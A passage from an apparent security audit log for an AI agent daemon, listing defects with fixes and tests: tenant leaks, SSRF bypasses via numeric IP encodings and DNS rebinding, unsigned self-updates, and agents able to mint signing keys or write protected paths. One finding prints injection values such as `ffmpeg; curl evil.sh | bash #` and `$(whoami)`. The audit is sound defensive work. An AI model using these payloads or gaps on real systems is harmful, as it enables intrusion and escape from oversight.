(`_build_memory_section` injects `## Agent Memory` straight into prompt
text), and either project silently overwrites the other via the upsert
`MemoryRepository.set` `on_conflict_do_update` (`db/repository.py:2776-2841`).
`routers/memory.py` (`POST`/`GET`/`DELETE /api/memory`) takes `agent_id` as a
bare client string with no ownership/project check — PSK-gated but not
tenant-scoped. By contrast `TaskEmbeddingModel` (`models.py:760-781`, also no
`project_id`) is fine: it holds 10 hardcoded canonical task-type descriptions
(system config, intentionally global). Same tenant-isolation theme as
H-DB-TENANT-SCOPING / H-OBS-TENANT-LEAK (Round-3/Round-7 above).

**Fix:** add `project_id` to `MemoryRecordModel`, include it in the unique
constraint (`(project_id, agent_id, key, namespace)`), and thread it through
`routers/memory.py` and `_build_memory_section` (`loop.py:542`).

**Tests:** project A cannot read or overwrite project B's memory row even
when both share the same `work_type`/`agent_id`; same-project read/write/
upsert still works unchanged.

### H-MCP-STOPALL-ORPHAN (MED, CONFIRMED) — one failing transport.stop() orphans every remaining MCP subprocess

**Defect:** `mcp/client.py:108-111` `stop_all()` loops
`await transport.stop()` with **no** per-transport exception isolation: if
any one `stop()` raises, the loop aborts, the remaining transports'
subprocesses are **orphaned**, and `self._transports.clear()` never runs.
Concrete trigger: `MCPStdioClient.stop()` (`transport.py:471-476`) calls
`self._process.terminate()` **unguarded** — only the later `kill()` branch
catches `ProcessLookupError` (:482-484) — so a TOCTOU race (child exits
between the returncode-is-`None` check and `terminate()`) raises
`ProcessLookupError` uncaught, which propagates through `stop_all()` and
skips every subsequent server's cleanup. `daemon.py:2103-2108` wraps
`stop_all()` in try/except but only logs generically. No test covers
multi-transport `stop_all()` with one throwing.

**Fix:** wrap each `transport.stop()` call in try/except (log and continue)
so one failure doesn't orphan the rest; guard the initial `terminate()`
against `ProcessLookupError` the same way the `kill()` branch already does.

**Tests:** `stop_all()` with one transport's `stop()` raising still stops
the others and clears the map; a `terminate()`-time
`ProcessLookupError` (simulated TOCTOU) is swallowed like the `kill()`
branch's existing handling.

**Re-confirmed (Round-12, 2026-07-10):** independently re-audited against
current line numbers — `client.py:108-111` loop and `transport.py:471-473`
unguarded `terminate()` are unchanged; `daemon.py:2103-2108`'s shutdown
`stop_all()` call is wrapped in a blanket `except Exception` that only logs,
so it does not compensate for the missing per-transport isolation. No new
defect surfaced; confidence raised from single-pass CONFIRMED to
independently-reconfirmed. See H-MCP-STARTUP-ORPHAN (Round-12, below) for the
related but distinct startup-side orphan gap this doesn't cover.

### H-MCP-UVX-UNPINNED (MED, CONFIRMED) — uvx package specs are exempt from the version-pin requirement other launchers enforce

**Defect:** `mcp/transport.py:147-231` `_validate_package_spec` requires a
concrete `pkg@x.y.z` pin only for `_NPM_FAMILY_LAUNCHERS`
(npx/npm/pnpm/yarn/bunx, :34); `uvx` is in `_REMOTE_FETCH_LAUNCHERS` (gets
the shell-metachar check) but is **explicitly excluded** from the pin
requirement (:36,142-144,180; tested at
`test_mcp_transport_pins.py:183-189`). So a bare `uvx some-package` (no
version pin) launches, fetching whatever is currently on PyPI — a
supply-chain substitution vector for a custom (non-catalog) project MCP
config. Mitigation: the curated `_KNOWN_SERVERS` catalog
(`catalog.py:203-305`) has **zero** uvx entries (all npx, all pinned), so
this is only reachable via a hand-authored config, not the shipped catalog.

**Fix:** require a version pin for `uvx` too (either `uvx pkg@x.y.z` or a
`uvx --from pkg==x.y.z` form), matching the npm-family requirement.

**Tests:** an unpinned `uvx` spec is rejected; a pinned `uvx pkg@x.y.z` (or
`--from pkg==x.y.z`) spec is still accepted (regression guard on the
legitimate path).

**Re-confirmed (Round-12, 2026-07-10):** independently re-audited —
`transport.py:36` `_UVX_FAMILY_LAUNCHERS` is still unioned into
`_REMOTE_FETCH_LAUNCHERS` (:38, shell-metacharacter check only) but the pin
check at `_check_spec` (:180) still gates on `launcher in
_NPM_FAMILY_LAUNCHERS` (:34), which excludes `uvx`. Code comment at
`transport.py:141-144` now explicitly documents the exclusion as
intentional, which this finding disputes as a live supply-chain gap for any
hand-authored (non-catalog) `uvx` config. No new defect surfaced; confidence
raised to independently-reconfirmed.

## Round-11 additions (2026-07-10 night-3)

### H-DENYLIST-DRIFT (MEDIUM, CONFIRMED) — three independent self-mod protected-path deny-lists disagree

**Defect:** three independently-maintained protected-path lists guard
different entry points into the self-modification write path and do not
agree with each other: `self_update/applier.py:41-79`
(`PROTECTED_PATH_MARKERS` + `_SEGMENT_EXACT_MARKERS`), `security/
capability_lattice.py:41-75` (`PROTECTED_FILE_STEMS`/
`PROTECTED_FILE_SUBSTRINGS`/`PROTECTED_PATH_SEGMENTS` via `is_protected_path()`),
and `self_update/apply.py:51-65` (`_HARD_DENY_SUBSTRINGS`/
`_HARD_DENY_SEGMENTS`). Concretely: `applier.py`'s `.github`/`/workflows/`/
`pyproject.toml`/`makefile`/`alembic`/`/migrations/`/`setup.cfg`/`tox.ini`/
`.pre-commit`/`dockerfile` markers are entirely absent from
`capability_lattice.py`'s list; `apply.py` denies only `.opencode`/`.claude`/
`settings.json`/`settings.local.json` and carries none of the build/CI/
migration markers the other two have. A path denied at one entry point into
the self-mod surface is allowed at another, so the effective guarantee
depends on which code path a given write happens to traverse rather than on
a single source of truth. Same root theme as H-SELFMOD-DENYLIST above (all
three lists also independently omit `AGENTS.md`/`CLAUDE.md`/`TASKS.md`).

**Fix:** consolidate into one shared deny-list module (e.g.
`security/protected_paths.py`) exporting the merged marker/stem/substring/
segment sets, and have `applier.py`, `capability_lattice.py`, and `apply.py`
all import from it rather than maintaining independent copies.

**Tests:** a path denied via any one of the three lists today is denied via
all three after consolidation (parametrized over the union of markers); no
existing legitimate path becomes newly denied (regression guard against an
over-broad merge).

### H-TENANT-CLAIM-FALLBACK (MEDIUM, CONFIRMED) — unscoped cross-tenant `claim_runnable` fallback when no project is selected

**Defect:** `event_loop/loop.py:1376-1380` `_phase_claim_runnable_todos`: when
`self._tick_project_id` is `None` — which happens whenever a `ProjectManager`
is configured but `select_project()` returns `None` because no project has
`dispatch_mode == "active"` (`projects/manager.py:321-338`, e.g. all projects
paused/inactive) — the phase calls `self._todo_repo.claim_runnable()` with
**no** `project_id` argument. `TodoRepository.claim_runnable`
(`db/repository.py:424-451`) only applies a `WHERE project_id == ...` filter
when `project_id` is not `None` (:437-440); with no project selected, the
query claims QUEUED todos across **every** tenant's queue, globally ordered
by `priority.desc()` then `created_at`. Net effect: a moment where the
scheduler intends "no project is runnable right now" silently degrades into
"claim across all tenants," crossing exactly the isolation boundary
`TodoRepository.scoped()` exists to enforce elsewhere.

**Fix:** fail closed — when `project_id` is `None` specifically because no
active project was selected (as distinct from single-project/no-
`ProjectManager` deployments, which legitimately pass `project_id=None`
throughout), skip claiming for that tick rather than falling through to the
unscoped `claim_runnable()` call.

**Tests:** with a `ProjectManager` configured and all projects
paused/inactive (`select_project()` returns `None`), `_phase_claim_runnable_todos`
claims nothing (assert `claim_runnable` is not called, or is called with a
sentinel that can never match a real tenant) even when QUEUED todos exist for
other tenants; the existing single-project / no-`ProjectManager` path
(`project_id` legitimately `None` end-to-end) is unaffected.

### H-ORNITH-SANDBOX-GAPS (MEDIUM, latent — off by default) — export arbitrary file-write + unsandboxed coding-agent subprocess

**Status:** both defects are gated behind `ORNITH_ENABLED` (off by default)
plus the daemon PSK, so neither is reachable in a default deployment;
recorded as defense-in-depth for when the feature is turned on.

**Defect (a) — arbitrary file-write via export `out_path`:** `routers/
ornith.py:182-209` `api_export` accepts a caller-supplied `out_path: str |
None` and forwards it unsanitized into `OrnithTrainingRepo.export_dataset`
(`ornith/training_repo.py:199-226`), which does `out = Path(out_path)`;
`out.parent.mkdir(parents=True, exist_ok=True)`; `out.open("w", ...)`
(:224-226) with no allowlist/realpath/traversal check — a PSK holder can
point `out_path` anywhere the daemon process can write. The identical
unconfined pattern (`out_path` straight into `Path(...).open("w")`) recurs in
`ornith/training_data.py:267-348`.

**Defect (b) — coding-agent subprocess has no sandbox:** `ornith/
mcp_server.py:150-155` runs `subprocess.run([self._binary_path, "--json",
json.dumps(arguments)], capture_output=True, text=True,
timeout=self._timeout_seconds)` — only a wall-clock timeout; no
`apply_limits`/rlimits/network-namespace restriction, unlike the hardened
`abtest/_child.py` sibling subprocess. This is the D-27 sandbox gap that
`security/security_backlog.py`'s `_check_d27_sandbox_limits` landed-guard
does **not** cover (it does not inspect the ornith binary invocation).

**Fix:** confine `out_path` to a scratch-directory allowlist (realpath +
`relative_to` containment, mirroring `self_update/
applier.py::_resolve_confined`) in both `training_repo.py` and
`training_data.py`; apply the project's existing `apply_limits`/sandboxed-
subprocess helper (as used by `abtest/_child.py`) to the `ornith_binary`
invocation in `mcp_server.py`, and extend `_check_d27_sandbox_limits` to
assert the ornith call site is covered so this doesn't silently regress.

**Tests:** an `out_path` escaping the scratch allowlist (absolute path
outside it, or a `..` traversal) is refused rather than written; a
legitimate in-allowlist `out_path` still exports; the ornith subprocess
invocation is asserted to run under the same rlimit/sandbox wrapper as
`abtest/_child.py` (regression guard); `_check_d27_sandbox_limits` fails if
the ornith call site stops being sandboxed.

### H-PRIORITY-UPPERBOUND (LOW, def-in-depth) — `priority` has no upper bound at the schema/repository layer

**Defect:** `schemas/todo.py:180-185` `_priority_non_negative` only rejects
`priority < 0`; there is no upper-bound validator. `claim_runnable`
(`db/repository.py:446-448`) orders candidates by `priority.desc()` first, so
an arbitrarily large priority value always wins the claim race. The public
`POST /api/todos` route maps priority through a 4-value enum before it
reaches the schema, so it is safe in practice today; but the self-improve
pipeline's `_coerce_priority` helper (cited as `self_improve.py:76-81` by the
originating audit; not independently re-confirmed at that exact path in this
pass) passes raw model-authored integers through to the same field with no
clamp, and any future caller that reaches the schema directly with an
untrusted integer inherits the same gap.

**Fix:** add an upper-bound validator alongside `_priority_non_negative` in
`schemas/todo.py` (e.g. clamp/reject above a fixed ceiling such as 100), and
clamp in `_coerce_priority` as well so the defense-in-depth exists at both
the production source and the schema boundary.

**Tests:** a priority above the chosen ceiling is rejected/clamped at the
schema layer; the existing enum-mapped public route is unaffected
(regression guard); `_coerce_priority` clamps an out-of-range raw int rather
than passing it through unchanged.

## Round-12 additions (2026-07-10 night-4)

### H-MCP-STARTUP-ORPHAN (CRITICAL, CONFIRMED) — partial multi-server MCP startup failure orphans already-spawned subprocesses

**Defect:** `daemon.py:1496-1536` constructs `MCPClient` and calls `await
mcp_client.start_all()` inside a single `try`. `MCPClient.start_all`
(`mcp/client.py:66-85`) iterates `self._configs.items()` and only adds a
server's transport to `self._transports` (`client.py:85`) AFTER its
`transport.start()`/`list_tools()` succeed (:77-78). The inner guard added
for Finding 6 (`client.py:72-82`) already stops the ONE transport that is
*currently* failing before re-raising — but every prior server in the same
`start_all()` call that started successfully is already resident in
`self._transports` and is untouched by that guard; the exception simply
propagates out of `start_all()` with those subprocesses still live. At the
`daemon.py` call site the propagated exception is caught by
`except ... as _mcp_exc` (:1531), which logs and unconditionally sets
`mcp_client = None` (:1536) — discarding the only reference to
`mcp_client._transports`, and with it every subprocess that HAD
successfully started. `MCPClient.stop_all()` is never invoked on the
discarded client. Net effect: for any MCP config with 2+ enabled stdio
servers, if server N (N>1) fails to start, servers 1..N-1's subprocesses
leak for the remaining life of the daemon process — even the shutdown-time
`stop_all()` call at `daemon.py:2103-2108` can't reach them, because
`app.state._mcp_client` (:1537) was already assigned the discarded `None`
reference before shutdown ever runs. This is the multi-server counterpart to
the already-fixed single-transport case inside `start_all()` itself
(`client.py:72-82`); the daemon call site has no equivalent guard.

**Fix:** in the `daemon.py` `except` block (:1531-1536), before setting
`mcp_client = None`, check `if mcp_client is not None` and
`await mcp_client.stop_all()` (in its own nested `try/except` so a cleanup
failure doesn't mask or replace the original startup error/log) to reap any
transports that did start before discarding the reference. Equivalently —
and preferable, since it keeps the invariant local to the class rather than
requiring every caller of `start_all()` to know about partial-failure
cleanup — have `MCPClient.start_all()` itself catch any exception from the
per-server loop, call `self.stop_all()` to reap everything started so far,
then re-raise.

**Tests:** a `start_all()` call with server 1 succeeding (transport tracked,
`stop()` spied) and server 2 raising during `start()`/`list_tools()`:
assert server 1's transport received a `stop()` call before/as part of the
exception propagating, and `self._transports` ends empty rather than
retaining server 1's orphaned entry; a daemon-level integration variant
covering the exact `daemon.py:1496-1536` call site — a 2-server config where
server 2 fails — asserts server 1's subprocess is torn down rather than
surviving past the `except` block that nulls `mcp_client`.

### H-SSRF-NUMERIC-IP (MEDIUM, PLAUSIBLE) — decimal/octal/hex IP literal encodings bypass `host_is_blocked`

**Status:** surfaced as a sibling gap while re-confirming H-WEBRETRIEVE-REBIND
(Round-4) / H-CONNECTOR (above) during this pass; not previously recorded in
this doc as its own finding.

**Defect:** `security/ssrf.py:138-141` `host_is_blocked`'s numeric-literal
path calls `ipaddress.ip_address(host)` and, on `ValueError`, falls through
to `return False` (not blocked) — the same fallthrough that (correctly, by
design) lets ordinary non-IP hostnames through to the name-only blocklist.
`ipaddress.ip_address` only accepts a canonical dotted-quad (or IPv6) form;
it rejects a bare decimal integer (e.g. `"2130706433"`, which is
`127.0.0.1` as a 32-bit int), a leading-zero octal-flavored quad (e.g.
`"0177.0.0.1"`, rejected by `ipaddress` since the CVE-2021-29921 leading-zero
fix), and a hex-prefixed form (e.g. `"0x7f000001"`) — all three raise
`ValueError` in `ip_address()` and are therefore treated as "not an IP,
must be a hostname" by `host_is_blocked`, i.e. **not blocked**, even though
each is a well-known alternate encoding of a loopback/internal address.
Whether this is actually exploitable end-to-end depends on whether the
downstream resolver/HTTP client (`urllib.request` in `retrieval/web.py`,
`httpx` in the connector layer) itself accepts and resolves one of these
non-canonical forms as the literal IP — behavior that varies by platform
libc/resolver and is not independently verified in this pass, hence
PLAUSIBLE rather than CONFIRMED-exploitable. `resolved_host_is_blocked`
(`ssrf.py:173-234`) has the identical fallthrough shape (:207-211) for the
same reason, so it inherits the same gap for any caller that reaches it with
one of these encodings.

**Fix:** before falling through to "not an IP" in `host_is_blocked` (and the
equivalent branch in `resolved_host_is_blocked`), attempt a secondary parse
of a purely-numeric or `0x`/leading-zero-octal-shaped host as an integer
(and hex) IPv4 form (e.g. via `ipaddress.IPv4Address(int(host, 0))` guarded
by a strict regex so it only fires on inputs that look like one of these
alternate encodings, not on ordinary hostnames that happen to start with a
digit) and re-run `_ip_addr_is_blocked` on the result; deny if blocked.

**Tests:** `host_is_blocked("2130706433")` (decimal-encoded 127.0.0.1) →
`True`; `host_is_blocked("0177.0.0.1")` (octal-flavored loopback) → `True`;
`host_is_blocked("0x7f000001")` (hex-encoded loopback) → `True`; a decimal
encoding of a public IP is NOT blocked (regression guard against
over-broadly denying legitimate numeric-looking hosts); ordinary hostnames
starting with a digit (e.g. `"123movies.example.com"`) are unaffected
(regression guard against the new parse path misfiring on real hostnames).

## Round-13 additions (2026-07-10)

### H-SIGNING-NO-VERIFY (HIGH, CONFIRMED — nuanced) — self-update and hot-reload apply content with no signature/checksum verification against a trust anchor

**Defect:** the self-update apply path (`routers/self_update.py:67`
`plan = classify(request)` → `:73`
`result = apply_plan(plan, request, audit_sink=audit_sink)`, with
`apply_plan` in `self_update/apply.py:169-371`) and the generic hot-reload
apply path (`reload/hot_reloader.py::HotReloader.reload()`, lines 92-116,
covering config/template/playbook/skill reload) both apply local content
with **no cryptographic signature or checksum verification against a trust
anchor**. `apply_plan` is gated by an approval-token check (`verify_psk`,
:208-218), protected-path/capability-lattice refusal (:242-265), a
`requires_approval` tier gate (:285-293), and for CODE-tier changes a
mandatory caller-supplied `validate` callback that fails closed if absent
(:334-353) — so it is not wholly unguarded, but none of those gates is a
content-hash/signature check, and the CONFIG/YAML tier (the same tier
exploited by H-SELFMOD-DENYLIST above) has no validate callback at all.
`HotReloader.reload()`'s generic config/template/playbook/skill path
(:92-116) has zero verification of any kind. The one code path that DOES
have an integrity check — `HotReloader.reload_code_module()` (:118-326,
sha256 compare at :238-248 via `hmac.compare_digest`) — is optional and
silently skipped whenever the caller omits `expected_sha256`.

Separately, the daemon's cosign keystore (`routers/signing.py:46-153`,
`secrets/cosign.py`) is confirmed **completely disconnected** from both
apply paths — it only exposes generate/list/read/delete for cosign keys and
gitsign config, with zero imports of `cosign`/`signing` under `self_update/`
or `reload/`. The one signature-verification function that does exist in
the codebase, `integrity/scanner.py:614` `verify_signature` (exported via
`integrity/__init__.py`), is wired only into the separate FIM/overlay-guard
feature (`routers/integrity.py`), not into either apply path.

**Fix:** wire a genuine trust-anchor verification (a cosign signature check
via the already-built keystore, or at minimum a required, non-optional
checksum against a pinned/attested value) into `apply_plan`'s CODE and
CONFIG/YAML tiers before the write, and into `HotReloader.reload()`'s
generic path; make the existing `reload_code_module` sha256 gate mandatory
rather than opt-in for any caller reachable from an untrusted-origin
proposal.

**Tests:** an `apply_plan` call for a CONFIG-tier change with no
verifiable signature/checksum is refused once the gate lands (currently
applies); `HotReloader.reload()` refuses unsigned/unverified content once
wired; `reload_code_module` refuses when `expected_sha256` is omitted for
any caller path that is supposed to require it (regression guard against
the optional clause being silently dropped from a caller).

### H-SIGNING-NO-PRIVSEP (MEDIUM, CONFIRMED) — `/admin/signing/*` has no privilege tier beyond the shared PSK

**Defect:** `daemon.py:2826` (`signing.register(app, daemon_state)`)
registers the signing router in the same flat, unconditional sequence of
~30 `*.register(app, daemon_state)` calls as every other router — no
wrapper, no role/scope argument. `routers/signing.py`'s six endpoints —
cosign generate (:46), list (:68), read (:92), delete (:105), gitsign
config write (:116), gitsign read (:135) — take no `Depends(...)`/role
parameter and call no admin-vs-agent check; the only auth applied anywhere
is the single shared-PSK `auth_and_stats_middleware` (`daemon.py:2468-2504`),
the same credential injected into every dispatched agent's subprocess env
(`renderers/runner.py:227-229`). So any PSK holder — including any
dispatched agent — can mint, list, read, or delete cosign signing keys for
any project. Currently harmless in practice only because H-SIGNING-NO-VERIFY
(above) means nothing consults these keys for a trust decision yet; it
becomes directly exploitable (an agent minting its own trusted signing key)
the moment that finding is fixed without this one being fixed alongside it.

**Fix:** address together with H-SIGNING-NO-VERIFY — add an operator-only
capability/role check in front of `/admin/signing/*` (ties to
H-ADMIN-PSK-ONLY's broader per-endpoint capability-gate fix), so a mere
agent-tier PSK cannot mint or exfiltrate signing material.

**Tests:** a request carrying an agent-tier PSK is refused on
`/admin/signing/cosign/generate` and `/delete`, reserved for operator tier;
an operator-tier credential still succeeds (regression guard).

### H-STREAM-PROCESSOR-CMDI (HIGH, CONFIRMED) — `/admin/stream/dispatch` processor binary/args are shell-injected into a generated script, unsanitized

**Defect:** `stream/__init__.py`'s `_write_shell_processor` (lines 125-144)
takes `binary = processor.get("binary", kind)` (:129) and
`extra_args = processor.get("args", "")` (:130) straight from the untyped
`processor` dict and f-string-interpolates them into a generated `.sh` file
(`f'exec {binary} {extra_args} "$CHUNK_PATH"'`, :140) that is `chmod
0o755`'d (:143) and later executed as a script — not passed as an argv
list to `subprocess.run`. No `shlex.quote`, no escaping, no character
allowlist. Source: `routers/stream.py`'s `StreamDispatchRequest.processor`
field (:45, `dict[str, object] | None`) has **no** `field_validator` —
unlike the `role` field, which has `_validate_role_name`/`_ROLE_NAME_RE`
(:50-55). The only check on `processor` is a `tool` key allowlist against
`SUPPORTED_PROCESSOR_TOOLS` (:116-125); `binary`/`args` are never
inspected. Flow: `cloner.materialize_processor(clone_path,
processor=dict(req.processor))` (:132) → `stream/__init__.py:104`
`materialize_processor` → for `tool in {"whisper.cpp","ffmpeg"}` dispatches
to `_write_shell_processor` (:125), reaching the sink. A value like
`binary="ffmpeg; curl evil.sh | bash #"` or `args="$(whoami)"` is
interpreted by bash at execution time — classic shell-metacharacter command
injection via string-formatting into a script file. PSK-gated (same
surface as the already-fixed H-STREAM-TRAVERSAL role-traversal bug in this
same file), but any PSK holder can trigger it — a genuinely distinct
defect from the role-traversal one (different field, different sink,
injection not traversal).

**Fix:** validate/allowlist `binary` against a small known-tool set
(mirroring `SUPPORTED_PROCESSOR_TOOLS`), and pass `args` as a `list[str]`
argv (constructed via `shlex.split` + a character/pattern allowlist, or
rejected outright if it contains shell metacharacters) rather than
interpolating a raw string into a shell script; alternatively invoke the
processor directly via `subprocess.run([binary, *args, chunk_path])` and
drop the generated-`.sh`-file indirection entirely.

**Tests:** a `processor={"binary": "ffmpeg; touch /tmp/pwned"}` (or an
`args` value containing `;`/`|`/`` ` ``/`$()`) is rejected before the
script is written/executed; a legitimate `ffmpeg`/`whisper.cpp` processor
with ordinary args still materializes and runs correctly (regression
guard).

### H-CONNECTOR-EXC-LEAK (MEDIUM, CONFIRMED) — connectors return raw exception text to callers, breaking the documented generic-marker pattern

**Defect:** the codebase has a documented safe pattern in
`redis_stats.py:180-195` (`health()`): log full exception detail via
`logger.warning(..., exc_info=True)`, return a **generic marker** string
(`"executor init failed"`/`"probe failed"`) — explicitly to avoid leaking
internal hostnames/topology/credentials embedded in driver errors. Several
other connectors break this pattern by returning raw `str(exc)`/f-string-
embedded exception text directly in a normalized health/query record:
`connectors/redfish.py:201` (`f"unreachable: {exc}"`), `:237`
(`message=f"query error in {fn.__name__}: {exc}"`), `:240`
(`raw={"error": str(exc)}`); `connectors/signoz.py:261` (`"error":
str(exc)`); `connectors/jenkins.py:170` (`"error": str(exc)`);
`connectors/aws_observability.py:240` (`f"boto3 unavailable: {exc}"`),
`:242` (`"detail": str(exc)`). A broader sweep this round found more
instances of the same anti-pattern: `connectors/containerd.py:347`
(`raw={"path": str(path), "error": str(exc)}`),
`connectors/local_files.py:150,279` (`JsonlLogSource.health()`/
`SyslogGrepSource.health()`, both `"error": str(exc)`),
`connectors/windows_event_log.py:117,432,461` (subprocess stderr text
flows unfiltered into the query error record and `health()` detail),
`connectors/mac_unified_log.py:84,220,223` (same subprocess-error-as-tuple
shape, `f"probe raised: {exc!r}"` at :223), `connectors/kubernetes.py:348,350`
(`self._error(str(exc))` / `self._error(f"query failed: {exc}")`). Both
reachable endpoints pass connector output straight through with no
sanitization: `/admin/connectors/health` (`daemon.py:2946`,
`await asyncio.to_thread(reg.health_all)` returned verbatim) and
`/api/observe/health`/`/api/observe/query` (`routers/observe.py:114,125`).
No new instances found in `okta.py`, `nomad.py`, `cilium_hubble.py`,
`docker_engine.py`, `podman.py`, `azure_resource_graph.py`,
`elastic_apm.py`, `pyroscope.py`, or `openshift.py`. See
H-GATEWAY-EXC-CREDLEAK (below) for a related but more severe HIGH sibling
in the model-provider gateway, where the leaked exception text can be
credential-bearing.

**Fix:** apply the `redis_stats.py` generic-marker pattern (log full
detail, return a static/generic `detail`/`error` string) to every cited
sink above.

**Tests:** each connector's `health()`/`query()` error path returns a
generic marker (not the raw exception text) while the full detail still
reaches the logger with `exc_info=True`; a parametrized regression test
across the ~11 cited call sites.

### H-WEBHOOK-DELIVERY-REBIND (MEDIUM, CONFIRMED) — registered webhooks are SSRF-checked only at registration, never re-checked at delivery

**Defect:** `events/hooks.py::register_webhook` (:130-159) SSRF-checks the
URL exactly once, at registration time, via `_ensure_safe_webhook_url`
(:24-37, calling `is_url_blocked` at :33) before persisting it into
`WebhookConfig`/`HookRegistration` (:145-157). `fire()` (:167-207) and the
delivery helpers `_fire_webhook`/`_do_post_async` (:233-301/:241-273)
never call `is_url_blocked`, `resolved_host_is_blocked`, or
`resolve_and_pin` again — the delivery path posts directly to the URL
stored at registration time. `follow_redirects=False` is set on the
delivery request (:260, with a comment acknowledging redirect-based
bypass), but that only blocks a 30x-based bypass, not a DNS A-record
change between registration and a later `fire()` call: a long-lived
webhook registration whose hostname is later repointed (DNS rebind) to
`169.254.169.254`/RFC1918/loopback is never caught, because the only guard
ever runs once, at registration. This is a distinct sink from the
already-documented H-WEBRETRIEVE-REBIND (`retrieval/web.py::fetch_web_page`)
and H-CONNECTOR (`connectors/nomad.py`/`cilium_hubble.py`) — a different
module/class with no shared functions beyond the common `is_url_blocked`
import.

**Fix:** add a bounded re-check at delivery time — either
`resolved_host_is_blocked` (or the planned
`security/ssrf.py::resolve_and_pin`) called immediately before
`_do_post_async`'s connect, or pin the vetted IP from registration time and
connect via that IP with an explicit `Host:` header (mirroring the fix
pattern already proposed for H-CONNECTOR/H-WEBRETRIEVE-REBIND).

**Tests:** a webhook registered against a public IP, then DNS-rebound to
`169.254.169.254` before `fire()`, is refused at delivery time rather than
posted; a legitimate, stable-DNS webhook still fires successfully
(regression guard).

### H-GATEWAY-SCOPE-FAILOPEN (LOW, CONFIRMED) — project-secrets-resolver failure falls back to the shared/base resolver; SSRF errors disclose internal URLs

**Defect:** `src/general_ludd/models/gateway.py::_resolver_for_project`
(:729-764) catches **any** exception from `for_project(project_id)` —
including a malformed-id `ValueError`, which the function's own docstring
(:746-748) acknowledges — and falls back to `self._secrets` (the
shared/unscoped base resolver) at :758-764, silently dropping per-project
secret-resolver scoping for that call. Not a full cross-project leak
(`base` only reaches shared/base aliases, not another project's
`projects/<id>/<alias>` scoped secrets), but it is a fail-open on the
scoping decision itself: an error condition that should probably deny or
surface loudly instead quietly widens to the shared credential set.
Separately, two `SSRFRejectionError` sites in the same file —
`gateway.py:511-514` and `:833-836` — interpolate the resolved `api_base`
URL (via `!r`) directly into the exception message (`f"SSRF guard:
refusing blocked api_base_alias URL {base_url!r} for profile
'{profile_id}'"`), an internal-endpoint info-disclosure concern if that
message ever reaches a caller outside the trust boundary.

**Fix:** narrow the `except Exception` in `_resolver_for_project` to the
specific expected failure modes (e.g. `ValueError` from a malformed id) and
fail closed (raise or return `None` rather than silently falling back to
the shared resolver) for anything else; redact or genericize the
`base_url` in both `SSRFRejectionError` messages before they can propagate
to an external caller.

**Tests:** a malformed `project_id` passed to `_resolver_for_project` is
denied/raises rather than silently resolving against the shared base; a
blocked `api_base_alias` SSRF rejection no longer echoes the raw internal
URL in its message (or is only logged, not returned to the caller).

### H-ADAPTIVE-ROUTER-NULL (HIGH, CONFIRMED) — third instance of the construction-order null-dependency bug class: `_adaptive_router`'s guard omits the `is None` clause every sibling has

**Defect:** same root-cause cluster as H-STARTUP-NULL-DEPS (Round-8,
re-confirmed above). `daemon.py::_get_or_create_extended_subsystems`
(:2221-2320) guards `_adaptive_router` construction at :2260-2261 with
**only** `not hasattr(app.state, "_adaptive_router")` — missing the
`or app.state._adaptive_router is None` clause that every sibling branch in
the same function has (`_project_manager` :2237, `_utilization_tracker`
:2240, `_model_registry` :2242, `_skill_registry` :2244, all
`not hasattr(...) or app.state.X is None`). Because `create_daemon_app`
pre-seeds `app.state._adaptive_router = None` at :2374 (alongside the four
siblings at :2370-2373), `hasattr(app.state, "_adaptive_router")` is
`True` from app-creation onward — so the real-construction `if` branch
(:2261-2306, building an `AdaptiveRouter` with `health_tracker`/
`quantization_map`/Pareto routing/cross-project borrowing) **never
executes**; only the `elif` at :2307-2308 fires, re-reading the pre-seeded
`None`. This flows into `EventLoop(adaptive_router=ext["adaptive_router"],
...)` at :1708 and `ReturnReviewer(router=ext.get("adaptive_router"), ...)`
at :1358-1361 — both permanently `None` in production, so Pareto-based
adaptive model/prompt routing and cross-project borrowing are dead code,
identical in shape to the `infra_tracker`/`deployment_manager` bug above
(this file's CA-T7/CA-T8/CA-T9/H3 comments already document 3 prior fixes
of this exact bug class; this is a 4th unfixed instance alongside
`infra_tracker`/`deployment_manager`).

**Fix:** add the missing `or app.state._adaptive_router is None` clause to
the :2260-2261 guard, matching the four sibling branches exactly.

**Tests:** after `_get_or_create_extended_subsystems` runs against a
freshly-created `app` (where `_adaptive_router` is pre-seeded `None`), the
returned `ext["adaptive_router"]` is a live `AdaptiveRouter` instance, not
`None`; `EventLoop.adaptive_router` and `ReturnReviewer.router` are
asserted non-`None` after daemon startup (regression guard against this
construction-order class recurring again, mirroring the CA-T7/8/9
regression tests already in the suite).

### H-GATEWAY-EXC-CREDLEAK (HIGH, CONFIRMED) — raw provider-exception text (potentially credential-bearing) flows unredacted into an admin-visible facet and on-disk replay records

**Defect:** the codebase already has a redaction helper —
`secrets/manager.py::_sanitize_error`/`_redact` (:214-240, regex +
known-value substitution, tested by
`tests/unit/test_secrets_log_sanitization.py`) — but it is **never
imported anywhere under `src/general_ludd/models/`** (checked all 18 files
in that package). This matters because `models/timeout_detector.py`
classifies 401/403 provider responses as `AUTH_ERROR`
(`_AUTH_ERROR_CODES = {401, 403}` at :56; checked at :168-169 and
:192-193) — exactly the "invalid API key" class of error that can embed
the key itself in provider error text. Two unredacted sinks:
- `models/gateway.py:931` `record_model_call(error=str(exc))` →
  `metrics/collector.py:227-232` stores the raw string in a
  `_recent_failures` ring buffer → `controllers/environment_advisor.py:
  526-541` surfaces up to 3 raw failure strings as `"recent_failures"` →
  `routers/environment.py:753` `GET /api/environment` returns them
  (PSK-gated per `daemon.py`'s `_PUBLIC_PATHS`, but any PSK holder can read
  it).
- `daemon.py:1913-1919` — a `_gateway_executor except Exception` block
  returns `f"Error: {exc}"` as the task's **successful** output (not an
  error status) → `agents/dispatcher.py:211-232`
  (`status="completed", output=output`) → `replay/recorder.py:23-27`
  persists it **unredacted** to disk at
  `.gludd/replays/runs/<run_id>/events/<seq>.json` →
  `daemon_wiring.py:155-156` (`return result.output or ""`) feeds it back
  to the invoking agent.
- Log-only (lower severity, generic `HTTPException` returned to the
  caller): `routers/models.py:592,744` and `models/failover.py:38-46` (the
  latter also retains events in-memory via `get_failover_events()`, not
  just logs).
- Confirmed correct, for contrast: `gateway.py:904-909` logs a **literal**
  `api_key=***REDACTED***` string, never the real key.

Verified-safe, not flagged: key-sourcing allowlist (`secrets/env.py:22-93`),
cross-project secret scoping (`secrets/project_secrets.py:20-64`),
cross-provider failover re-resolving its own alias rather than borrowing
another's (`gateway.py:1412-1536`), and the project-scoped response cache
(`response_cache.py:21-38`).

**Fix:** promote `SecretsManager._redact`'s known-value+regex approach to
